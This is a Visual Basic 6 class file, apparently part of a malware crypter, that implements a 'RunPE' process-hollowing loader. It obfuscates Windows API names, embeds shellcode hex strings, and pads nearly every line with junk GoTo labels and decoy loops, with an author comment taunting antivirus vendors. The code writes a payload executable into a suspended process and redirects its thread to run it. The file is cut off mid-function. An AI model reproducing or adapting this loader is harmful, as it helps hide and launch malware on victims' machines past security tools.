VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Project     : Run PE Generator v1.1 - W7
' Author      : OiJkN
' Now         : 21/03/2010  21:13
' Compile     : P-Code !!!
' Thanks to   : Cobein/Slayer/Karcrack/Squeezer/Abronsius
'
'                           Make a special detection for me ;)
'---------------------------------------------------------------------------------------

Option Explicit

Private Const p6q3y5vBEuUvcMIyRHwM       As Long = &H5A4D&
Private Const W1F7e1boDjCnrRGDvPMi        As Long = &H4550&

Private Const F5j5q8JefptXnGatndJS           As Long = &H40
Private Const S3V1A1lwwNRUMkAscKNh           As Long = &HF8
Private Const K2c6I3IuWrqTBSEIhITN     As Long = &H28
Private Const f5A3t6itLZuirQKnpWqy As Long = &H28


Private Const E8Z6i6luBJmAPTVNmCte             As String = "8B4C240851<n5b0L4ATXoBomgySCNTP>E8<a7s2P4vdHWDKckaGBCAF>5989016631C0C3"
Private Const M2j2Q5aJXyvXgsVoTrKj          As String = "8B4C2408565531C0648B70308B760C8B761C8B6E088B7E208B3638471875F3803F6B7407803F4B7402EBE789295D5EC3"


Private Const K3P6Q7XhnjyMbiktRMpr                    As String = "<n5b0L4ATXoBomgySCNTP>"
Private Const Y5w1u4WWVaLSZpQPfVYQ                    As String = "<a7s2P4vdHWDKckaGBCAF>"

Private Const o3v8c3lcTgqZZNNnvJlF              As Long = &H10007
Private Const k1a6a4RjhEnwEAMddABK          As Long = &H4
Private Const h2s1o8OWMrmnlqbUbGgS                As Long = &H1000
Private Const i6o5G6NwshCsjvHqpdPq               As Long = &H2000
Private Const N4n3m4cDqoiBwUpPURcf    As Long = &H40

Private Type T7p0J0hvPjDvmSbcafQJ
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type Q8I1X4dVuJCmUWqTYlvR
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type e3E5C0cKbNRrSdXpmJfE
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type y7D3j1sCZUwAgAGODirs
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As e3E5C0cKbNRrSdXpmJfE
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type q8T4g2YXnrtlLaSDkmHj
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type o0h8U3yFRsNrQiIitnGo
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type M8G2I3kAHJSpkOQvDWeT
    VirtuaC6t0R7rHvArQtYWEsNEu              As Long
    Size                        As Long
End Type

Private Type u8t0j7wOonEtvoNqVTBp
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As M8G2I3kAHJSpkOQvDWeT
End Type

Private Type K0q1P8wllMVGiCgFXiXU
    Signature                   As Long
    FileHeader                  As o0h8U3yFRsNrQiIitnGo
    OptionalHeader              As u8t0j7wOonEtvoNqVTBp
End Type

Private Type O5d0k8BvJZaywHeMoFlr
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type L3I7j6inYRYDdPfildCf
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtuaC6t0R7rHvArQtYWEsNEu              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private Declare Function n2b3E6oJlpEOjvjWwUSu Lib "USER32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long
Private Declare Function c8f6J6uoHEbvVNKVmBWK Lib "gdi32" (ByVal hMetaFile As Long) As Long
Private Declare Function T7m2R8SXfVBKKJOkrdqp Lib "USER32" Alias "LoadCursorA" (ByVal hLib As Long, ByVal lngCursorID As Long) As Long
Private Declare Function G1M0c7kUDFZCGURANmmO Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Sub K8p5p5tEmmaMnKWkSjVZ Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private Declare Function W6L5K6AaALFXHdNYealD Lib "WINMM.DLL" (ByVal hMixer As Long) As Long
Private Declare Function R4a6I0ghOUnylRMNLQBI Lib "gdi32" (ByVal hColorSpace As Long) As Long
Private Declare Function P5H1W2OGfImkTHcSJXhQ Lib "gdi32" (ByVal hDC As Long) As Long

Private A7k5v8RmLRNZcqMOXhcG         As Long
Private V7I5V2qAAEohoTgfyCtS      As Long
Private h4L7u2rvKUpDqcEaZBiA         As Boolean
Private l7Q7C8OLhDcUQbsIdQaw          As Long
Private s4Y1Y5mbHQRPUrwFjvyM       As Long
Private n7i1W2AhjEglyerRRsBO(&HFF)   As Byte
        
Public Function p1o2e1fqkDlIrDJFQhvE() As Long
Debug.Print "OiJkN"
    Dim f0Y8D0KOcwAJSNqHZtNH As String, v5l6j7aTaFRRgknfETMy As String, d5B5h8GbobOpMKmUlXbB() As String, b7g0y3oNFCNesOCLjdHJ As String, p2P4N8CCBGcjqVihwBEy As Integer
    f0Y8D0KOcwAJSNqHZtNH = Chr$(51)
    For p2P4N8CCBGcjqVihwBEy = 1 To Len(f0Y8D0KOcwAJSNqHZtNH)
    v5l6j7aTaFRRgknfETMy = v5l6j7aTaFRRgknfETMy & IIf(p2P4N8CCBGcjqVihwBEy = 1, Asc(Mid$(f0Y8D0KOcwAJSNqHZtNH, p2P4N8CCBGcjqVihwBEy, 1)), Chr$(124) & Asc(Mid$(f0Y8D0KOcwAJSNqHZtNH, p2P4N8CCBGcjqVihwBEy, 1)))
    Next p2P4N8CCBGcjqVihwBEy
    d5B5h8GbobOpMKmUlXbB() = Split(v5l6j7aTaFRRgknfETMy, Chr$(124))
    For p2P4N8CCBGcjqVihwBEy = 0 To UBound(d5B5h8GbobOpMKmUlXbB)
    b7g0y3oNFCNesOCLjdHJ = b7g0y3oNFCNesOCLjdHJ & Chr(CLng(d5B5h8GbobOpMKmUlXbB(p2P4N8CCBGcjqVihwBEy)))
    Next p2P4N8CCBGcjqVihwBEy
    If b7g0y3oNFCNesOCLjdHJ = Chr$(51) Then GoTo 3
3:
End Function

Public Function q1d8q5MVVUYKDKoBBRUX(ByRef G2m6L2tATbQyrrpugmtL() As Byte, Optional l6B7t6KnSQwmHvnCMuuh As String) As Boolean
 GoTo j5M8v3twMJrFeeGOaDWC
j5M8v3twMJrFeeGOaDWC:
    Dim h1S5G4FdyHysmFCZJTZV                       As Long
GoTo M5E5o6BkHqCIEPguDEOl
M5E5o6BkHqCIEPguDEOl:
    Dim tq8T4g2YXnrtlLaSDkmHj       As q8T4g2YXnrtlLaSDkmHj
GoTo g1L7R4PupqotelsJkjAp
g1L7R4PupqotelsJkjAp:
    Dim tK0q1P8wllMVGiCgFXiXU       As K0q1P8wllMVGiCgFXiXU
GoTo s6J6R2vkGymBLttggIQd
s6J6R2vkGymBLttggIQd:
    Dim tL3I7j6inYRYDdPfildCf   As L3I7j6inYRYDdPfildCf
GoTo F4E5t1urlEBXHSYUfvwT
F4E5t1urlEBXHSYUfvwT:
    Dim tT7p0J0hvPjDvmSbcafQJ            As T7p0J0hvPjDvmSbcafQJ
GoTo U5C6M5IPiqfLHHFKyoya
U5C6M5IPiqfLHHFKyoya:
    Dim tQ8I1X4dVuJCmUWqTYlvR    As Q8I1X4dVuJCmUWqTYlvR
GoTo B6C1J0ZChRNCWMDRbKKv
B6C1J0ZChRNCWMDRbKKv:
    Dim ty7D3j1sCZUwAgAGODirs                As y7D3j1sCZUwAgAGODirs
GoTo j2g8I7HsvWLICURoKiok
j2g8I7HsvWLICURoKiok:
    Dim i2s1y0ZALFXUrNldZlDR                 As Long
GoTo U4m1K3cXBRjEXRHmyytk
U4m1K3cXBRjEXRHmyytk:
    Dim m4j1C5hOinylRaaZdBIP                  As Long
GoTo d6P5b7uwpOdWGnqLnrGQ
d6P5b7uwpOdWGnqLnrGQ:
    Dim t1G4Z5UsIBkSVpSWkhQd                    As Long
     Dim l0l4A4UveyhlLlvqJGdX As String, P2X7D4MVtnRTAUZhXDMM As String, L3m8B5rrILOGetmWEHbE() As String, I4T0P7oQYkNgMkCbCNHZ As String, J5P4g5nFTbclKFhjQWpw As Integer
    l0l4A4UveyhlLlvqJGdX = Chr$(55)
    For J5P4g5nFTbclKFhjQWpw = 1 To Len(l0l4A4UveyhlLlvqJGdX)
    P2X7D4MVtnRTAUZhXDMM = P2X7D4MVtnRTAUZhXDMM & IIf(J5P4g5nFTbclKFhjQWpw = 1, Asc(Mid$(l0l4A4UveyhlLlvqJGdX, J5P4g5nFTbclKFhjQWpw, 1)), Chr$(124) & Asc(Mid$(l0l4A4UveyhlLlvqJGdX, J5P4g5nFTbclKFhjQWpw, 1)))
    Next J5P4g5nFTbclKFhjQWpw
    L3m8B5rrILOGetmWEHbE() = Split(P2X7D4MVtnRTAUZhXDMM, Chr$(124))
    For J5P4g5nFTbclKFhjQWpw = 0 To UBound(L3m8B5rrILOGetmWEHbE)
    I4T0P7oQYkNgMkCbCNHZ = I4T0P7oQYkNgMkCbCNHZ & Chr(CLng(L3m8B5rrILOGetmWEHbE(J5P4g5nFTbclKFhjQWpw)))
    Next J5P4g5nFTbclKFhjQWpw
    If I4T0P7oQYkNgMkCbCNHZ = Chr$(55) Then GoTo 7
7:
    If Not h4L7u2rvKUpDqcEaZBiA Then Exit Function
GoTo T2P2S0KRhJIYOQIhKomV
T2P2S0KRhJIYOQIhKomV:
    Call K8p5p5tEmmaMnKWkSjVZ(tq8T4g2YXnrtlLaSDkmHj, G2m6L2tATbQyrrpugmtL(0), F5j5q8JefptXnGatndJS)
GoTo J5U2Z6SSFFgoCdvcBSeS
J5U2Z6SSFFgoCdvcBSeS:
    If Not tq8T4g2YXnrtlLaSDkmHj.e_magic = p6q3y5vBEuUvcMIyRHwM Then
GoTo Q2c4y5qvsEVWrsDaHkAg
Q2c4y5qvsEVWrsDaHkAg:
        Exit Function
GoTo L5m5I0ECHrlsWwiDGvWd
L5m5I0ECHrlsWwiDGvWd:
    End If
GoTo O1w3J0OYHHtgHdqFlEpt
O1w3J0OYHHtgHdqFlEpt:
    Call K8p5p5tEmmaMnKWkSjVZ(tK0q1P8wllMVGiCgFXiXU, G2m6L2tATbQyrrpugmtL(tq8T4g2YXnrtlLaSDkmHj.e_lfanew), S3V1A1lwwNRUMkAscKNh)
GoTo T1F0R2kHflhsyLghrByZ
T1F0R2kHflhsyLghrByZ:
    If Not tK0q1P8wllMVGiCgFXiXU.Signature = W1F7e1boDjCnrRGDvPMi Then
GoTo p1c8p5LTUSXJCJnAAPTW
p1c8p5LTUSXJCJnAAPTW:
        Exit Function
GoTo N6C8e2PjMQeoKXKvXtsV
N6C8e2PjMQeoKXKvXtsV:
    End If
GoTo D3G2j2VPheBXynjyNbvk
D3G2j2VPheBXynjyNbvk:
    i2s1y0ZALFXUrNldZlDR = I7L5p5bVnkHqCHEPghDE(Y1A0E7(Chr$(99) & Chr$(107) & Chr$(108) & Chr$(80) & Chr$(27) & Chr$(108) & Chr$(49) & Chr$(48), Chr$(82) & Chr$(51) & Chr$(117) & Chr$(51) & Chr$(103) & Chr$(52) & Chr$(115) & Chr$(112) & Chr$(77) & Chr$(105)))
GoTo t3M7r4swGybkkjnLSZEQ
t3M7r4swGybkkjnLSZEQ:
    m4j1C5hOinylRaaZdBIP = I7L5p5bVnkHqCHEPghDE(Y1A0E7(Chr$(222) & Chr$(20) & Chr$(218) & Chr$(236) & Chr$(108), Chr$(72) & Chr$(48) & Chr$(117) & Chr$(49) & Chr$(88) & Chr$(54) & Chr$(73) & Chr$(121) & Chr$(70) & Chr$(99)))
GoTo o1I2D5qjTBEYBFTPMllN
o1I2D5qjTBEYBFTPMllN:
    If l6B7t6KnSQwmHvnCMuuh = vbNullString Then
GoTo V6K5J5YKEWGcMXcZkCQY
V6K5J5YKEWGcMXcZkCQY:
        l6B7t6KnSQwmHvnCMuuh = Space(260)
GoTo Z6H0e5NTmukQLMKPAHOe
Z6H0e5NTmukQLMKPAHOe:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(i2s1y0ZALFXUrNldZlDR, Y1A0E7(Chr$(137) & Chr$(197) & Chr$(52) & Chr$(51) & Chr$(111) & Chr$(102) & Chr$(119) & Chr$(110) & Chr$(103) & Chr$(68) & Chr$(107) & Chr$(110) & Chr$(103) & Chr$(76) & Chr$(99) & Chr$(111) & Chr$(103) & Chr$(85), Chr$(88) & Chr$(48) & Chr$(68) & Chr$(54) & Chr$(69) & Chr$(49) & Chr$(82) & Chr$(71) & Chr$(109) & Chr$(117)))
GoTo F1U2N1eHljRGaRIVgPOC
F1U2N1eHljRGaRIVgPOC:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, App.hInstance, StrPtr(l6B7t6KnSQwmHvnCMuuh), 260
GoTo C5l8a8ZvPbPNHZWscnsp
C5l8a8ZvPbPNHZWscnsp:
    End If
GoTo B3T7p0XEhvdjDLBgbcaf
B3T7p0XEhvdjDLBgbcaf:
    With tK0q1P8wllMVGiCgFXiXU.OptionalHeader
GoTo Q1R8W1XbdVuXCmiWqhYm
Q1R8W1XbdVuXCmiWqhYm:
        tT7p0J0hvPjDvmSbcafQJ.cb = Len(tT7p0J0hvPjDvmSbcafQJ)
GoTo h3Q0p3nAOyNDdROJaYuQ
h3Q0p3nAOyNDdROJaYuQ:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(i2s1y0ZALFXUrNldZlDR, Y1A0E7(Chr$(213) & Chr$(66) & Chr$(59) & Chr$(223) & Chr$(244) & Chr$(101) & Chr$(82) & Chr$(112) & Chr$(109) & Chr$(97) & Chr$(103) & Chr$(113) & Chr$(113) & Chr$(85), Chr$(121) & Chr$(56) & Chr$(87) & Chr$(53) & Chr$(107) & Chr$(50) & Chr$(98) & Chr$(97) & Chr$(113) & Chr$(117)))
GoTo o8q0G3qrBLGjRlFoUdec
o8q0G3qrBLGjRlFoUdec:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, 0, StrPtr(l6B7t6KnSQwmHvnCMuuh), 0, 0, 0, k1a6a4RjhEnwEAMddABK, 0, 0, VarPtr(tT7p0J0hvPjDvmSbcafQJ), VarPtr(tQ8I1X4dVuJCmUWqTYlvR)
GoTo h3L3v1JZcfXvLEoWYsVa
h3L3v1JZcfXvLEoWYsVa:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(m4j1C5hOinylRaaZdBIP, Y1A0E7(Chr$(196) & Chr$(108) & Chr$(123) & Chr$(48) & Chr$(211) & Chr$(225) & Chr$(112) & Chr$(84) & Chr$(107) & Chr$(103) & Chr$(117) & Chr$(77) & Chr$(100) & Chr$(81) & Chr$(103) & Chr$(97) & Chr$(118) & Chr$(107) & Chr$(109) & Chr$(108), Chr$(119) & Chr$(55) & Chr$(79) & Chr$(53) & Chr$(86) & Chr$(49) & Chr$(110) & Chr$(112) & Chr$(76) & Chr$(110)))
GoTo n8T5U1hEDeMdPTtUfZro
n8T5U1hEDeMdPTtUfZro:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hProcess, .ImageBase
GoTo L5G8t1WlHuEbWACiCIQF
L5G8t1WlHuEbWACiCIQF:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(i2s1y0ZALFXUrNldZlDR, Y1A0E7(Chr$(72) & Chr$(87) & Chr$(12) & Chr$(116) & Chr$(119) & Chr$(99) & Chr$(110) & Chr$(67) & Chr$(110) & Chr$(110) & Chr$(109) & Chr$(97) & Chr$(71) & Chr$(122), Chr$(114) & Chr$(49) & Chr$(67) & Chr$(54) & Chr$(89) & Chr$(52) & Chr$(73) & Chr$(85) & Chr$(118) & Chr$(81)))
GoTo k8u8w3biNaZptynNcUFm
k8u8w3biNaZptynNcUFm:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hProcess, .ImageBase, .SizeOfImage, h2s1o8OWMrmnlqbUbGgS Or i6o5G6NwshCsjvHqpdPq, N4n3m4cDqoiBwUpPURcf
GoTo o1l7E0jvWWwHTuPtSkKk
o1l7E0jvWWwHTuPtSkKk:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(i2s1y0ZALFXUrNldZlDR, Y1A0E7(Chr$(223) & Chr$(98) & Chr$(119) & Chr$(74) & Chr$(27) & Chr$(80) & Chr$(112) & Chr$(109) & Chr$(97) & Chr$(103) & Chr$(113) & Chr$(113) & Chr$(79) & Chr$(103) & Chr$(111) & Chr$(109) & Chr$(112) & Chr$(123), Chr$(121) & Chr$(51) & Chr$(108) & Chr$(50) & Chr$(108) & Chr$(56) & Chr$(113) & Chr$(74) & Chr$(114) & Chr$(80)))
GoTo U2g2m4gmitLahjsQLoqX
U2g2m4gmitLahjsQLoqX:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hProcess, .ImageBase, VarPtr(G2m6L2tATbQyrrpugmtL(0)), .SizeOfHeaders, 0
GoTo d8F8Z3VUYKQXoPOeUXPn
d8F8Z3VUYKQXoPOeUXPn:
        For h1S5G4FdyHysmFCZJTZV = 0 To tK0q1P8wllMVGiCgFXiXU.FileHeader.NumberOfSections - 1
GoTo R8t5Q6aRfpYYLMmyIjEi
R8t5Q6aRfpYYLMmyIjEi:
            K8p5p5tEmmaMnKWkSjVZ tL3I7j6inYRYDdPfildCf, G2m6L2tATbQyrrpugmtL(tq8T4g2YXnrtlLaSDkmHj.e_lfanew + S3V1A1lwwNRUMkAscKNh + f5A3t6itLZuirQKnpWqy * h1S5G4FdyHysmFCZJTZV), Len(tL3I7j6inYRYDdPfildCf)
GoTo H4k4W3ifDmvDLbcwAJgO
H4k4W3ifDmvDLbcwAJgO:
            D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hProcess, .ImageBase + tL3I7j6inYRYDdPfildCf.VirtuaC6t0R7rHvArQtYWEsNEu, VarPtr(G2m6L2tATbQyrrpugmtL(tL3I7j6inYRYDdPfildCf.PointerToRawData)), tL3I7j6inYRYDdPfildCf.SizeOfRawData, 0
GoTo q1n8N3KpllkpaTaFfRhk
q1n8N3KpllkpaTaFfRhk:
        Next h1S5G4FdyHysmFCZJTZV
GoTo n5E6M8rgBriyGoocOpMY
n5E6M8rgBriyGoocOpMY:
        ty7D3j1sCZUwAgAGODirs.ContextFlags = o3v8c3lcTgqZZNNnvJlF
GoTo m3l4b0pmgyToNTPbesOQ
m3l4b0pmgyToNTPbesOQ:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(m4j1C5hOinylRaaZdBIP, Y1A0E7(Chr$(56) & Chr$(154) & Chr$(167) & Chr$(165) & Chr$(244) & Chr$(67) & Chr$(109) & Chr$(108) & Chr$(118) & Chr$(103) & Chr$(122) & Chr$(118) & Chr$(86) & Chr$(106) & Chr$(112) & Chr$(103) & Chr$(99) & Chr$(102), Chr$(74) & Chr$(50) & Chr$(76) & Chr$(52) & Chr$(110) & Chr$(48) & Chr$(75) & Chr$(77) & Chr$(86) & Chr$(115)))
GoTo w1D5y2iCylRaaZePIPtH
w1D5y2iCylRaaZePIPtH:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hThread, VarPtr(ty7D3j1sCZUwAgAGODirs)
GoTo G4Z5U8IBkTVpSXkuQdRD
G4Z5U8IBkTVpSXkuQdRD:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(i2s1y0ZALFXUrNldZlDR, Y1A0E7(Chr$(223) & Chr$(98) & Chr$(119) & Chr$(74) & Chr$(27) & Chr$(80) & Chr$(112) & Chr$(109) & Chr$(97) & Chr$(103) & Chr$(113) & Chr$(113) & Chr$(79) & Chr$(103) & Chr$(111) & Chr$(109) & Chr$(112) & Chr$(123), Chr$(121) & Chr$(51) & Chr$(108) & Chr$(50) & Chr$(108) & Chr$(56) & Chr$(113) & Chr$(74) & Chr$(114) & Chr$(80)))
GoTo e0A5J4MQqQbVnlIdCuqC
e0A5J4MQqQbVnlIdCuqC:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hProcess, ty7D3j1sCZUwAgAGODirs.Ebx + 8, VarPtr(.ImageBase), 4, 0
GoTo T6D7B4TvweEMChqrpuSY
T6D7B4TvweEMChqrpuSY:
        ty7D3j1sCZUwAgAGODirs.Eax = .ImageBase + .AddressOfEntryPoint
GoTo f2X4m7skJYRCjlGinBwg
f2X4m7skJYRCjlGinBwg:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(m4j1C5hOinylRaaZdBIP, Y1A0E7(Chr$(94) & Chr$(106) & Chr$(109) & Chr$(27) & Chr$(116) & Chr$(65) & Chr$(109) & Chr$(108) & Chr$(118) & Chr$(103) & Chr$(122) & Chr$(118) & Chr$(86) & Chr$(106) & Chr$(112) & Chr$(103) & Chr$(99) & Chr$(102), Chr$(110) & Chr$(51) & Chr$(84) & Chr$(48) & Chr$(71) & Chr$(52) & Chr$(104) & Chr$(88) & Chr$(68) & Chr$(119)))
GoTo t3T8D3rMqPgHhsmFnKtF
t3T8D3rMqPgHhsmFnKtF:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hThread, VarPtr(ty7D3j1sCZUwAgAGODirs)
GoTo L1S6G1RojNPyCVdSwttr
L1S6G1RojNPyCVdSwttr:
        t1G4Z5UsIBkSVpSWkhQd = N6S8L7wRZPupqoteXeJk(m4j1C5hOinylRaaZdBIP, Y1A0E7(Chr$(84) & Chr$(66) & Chr$(60) & Chr$(187) & Chr$(179) & Chr$(245) & Chr$(109) & Chr$(103) & Chr$(86) & Chr$(106) & Chr$(112) & Chr$(103) & Chr$(99) & Chr$(102), Chr$(119) & Chr$(56) & Chr$(67) & Chr$(54) & Chr$(116) & Chr$(48) & Chr$(82) & Chr$(114) & Chr$(114) & Chr$(72)))
GoTo V1N3l2LbRULkNsqYNhXO
V1N3l2LbRULkNsqYNhXO:
        D0e6b8awQpQbVnXtdotq t1G4Z5UsIBkSVpSWkhQd, tQ8I1X4dVuJCmUWqTYlvR.hThread, 0
GoTo c6V3I1jrFgBfEVhWTNfc
c6V3I1jrFgBfEVhWTNfc:
    End With
GoTo i8A8H4ZuvGdKnEkqKSHm
i8A8H4ZuvGdKnEkqKSHm:
    q1d8q5MVVUYKDKoBBRUX = True
GoTo i6h6X3XCcOdhkcBeJsod
i6h6X3XCcOdhkcBeJsod:
End Function

Public Function D0e6b8awQpQbVnXtdotq(ByVal t1G4Z5UsIBkSVpSWkhQd As Long, ParamArray Params()) As Long
GoTo w7e8D6lYLmJVjRiUYwmj
w7e8D6lYLmJVjRiUYwmj:
    Dim C3h7q0YTywekEMChcdbg        As Long
GoTo d8s3l2QMYbpLNWgbEUmH
d8s3l2QMYbpLNWgbEUmH:
    Dim h1S5G4FdyHysmFCZJTZV1           As Long
GoTo L1u4j6inYSZDQPfjmdDS
L1u4j6inYSZDQPfjmdDS:
    Dim w5f3T8DPrLqPgsgeYqnK       As String
GoTo L8c5A5guFZnaNnKJlSkW
L8c5A5guFZnaNnKJlSkW:
    Dim t1L1S6kGHRoVOuCUcSws     As String
    Dim a0a6f8uRnMEAMcrNBKhc As String, G1o1O4MrABEbipUggyAD As String, t3i4L8yQsvLHqEddFNZC() As String, V0Y7Q7CyOwUEPUQctIQR As String, a0s4Y1LemcIDECHrGWvv As Integer
    a0a6f8uRnMEAMcrNBKhc = Chr$(50)
    For a0s4Y1LemcIDECHrGWvv = 1 To Len(a0a6f8uRnMEAMcrNBKhc)
    G1o1O4MrABEbipUggyAD = G1o1O4MrABEbipUggyAD & IIf(a0s4Y1LemcIDECHrGWvv = 1, Asc(Mid$(a0a6f8uRnMEAMcrNBKhc, a0s4Y1LemcIDECHrGWvv, 1)), Chr$(124) & Asc(Mid$(a0a6f8uRnMEAMcrNBKhc, a0s4Y1LemcIDECHrGWvv, 1)))
    Next a0s4Y1LemcIDECHrGWvv
    t3i4L8yQsvLHqEddFNZC() = Split(G1o1O4MrABEbipUggyAD, Chr$(124))
    For a0s4Y1LemcIDECHrGWvv = 0 To UBound(t3i4L8yQsvLHqEddFNZC)
    V0Y7Q7CyOwUEPUQctIQR = V0Y7Q7CyOwUEPUQctIQR & Chr(CLng(t3i4L8yQsvLHqEddFNZC(a0s4Y1LemcIDECHrGWvv)))
    Next a0s4Y1LemcIDECHrGWvv
    If V0Y7Q7CyOwUEPUQctIQR = Chr$(50) Then GoTo 2
2:
    If t1G4Z5UsIBkSVpSWkhQd = 0 Then Exit Function
GoTo D1v4d5JwSJANYHGttVdp
D1v4d5JwSJANYHGttVdp:
    For h1S5G4FdyHysmFCZJTZV1 = UBound(Params) To 0 Step -1
GoTo S6R7H3HFROkUfkhsKLgh
S6R7H3HFROkUfkhsKLgh:
        t1L1S6kGHRoVOuCUcSws = t1L1S6kGHRoVOuCUcSws & Y1A0E7(Chr$(30) & Chr$(118), Chr$(105) & Chr$(54) & Chr$(100) & Chr$(48) & Chr$(102) & Chr$(49) & Chr$(73) & Chr$(112) & Chr$(101) & Chr$(111)) & S3V1H6MvNRTLkNrcYMhX(CLng(Params(h1S5G4FdyHysmFCZJTZV1)))
GoTo q2y4o4buDsYTUSXIBJmO
q2y4o4buDsYTUSXIBJmO:
    Next
GoTo P3V2m2teaOiZQeoXWKvX
P3V2m2teaOiZQeoXWKvX:
    C3h7q0YTywekEMChcdbg = VarPtr(n7i1W2AhjEglyerRRsBO(0))
GoTo S5s4r5iIytnGDZyUZWhk
S5s4r5iIytnGDZyUZWhk:
    C3h7q0YTywekEMChcdbg = C3h7q0YTywekEMChcdbg + (UBound(Params) + 2) * 5
GoTo A3W5p6OdvQjeTIJHMvpw
A3W5p6OdvQjeTIJHMvpw:
    C3h7q0YTywekEMChcdbg = t1G4Z5UsIBkSVpSWkhQd - C3h7q0YTywekEMChcdbg - 5
GoTo b7n0I2CbqiTBDYBFTdwM
b7n0I2CbqiTBDYBFTdwM:
    w5f3T8DPrLqPgsgeYqnK = E8Z6i6luBJmAPTVNmCte
GoTo l2i6K7IuYKEWTpMkcYkB
l2i6K7IuYKEWTpMkcYkB:
